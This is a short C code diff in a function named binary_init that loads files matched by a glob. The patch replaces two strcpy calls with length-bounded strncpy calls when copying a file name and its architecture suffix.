@@ -31,9 +31,9 @@ BOOL binary_init(void)
 #ifdef DEBUG
         printf("(%d/%d) %s is loading...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
 #endif
-        strcpy(file_name, pglob.gl_pathv[i]);
+        strncpy(file_name, pglob.gl_pathv[i], 256);
         strtok(file_name, ".");
-        strcpy(bin->arch, strtok(NULL, "."));
+        strncpy(bin->arch, strtok(NULL, "."), 6);
         load(bin, pglob.gl_pathv[i]);
     }
 
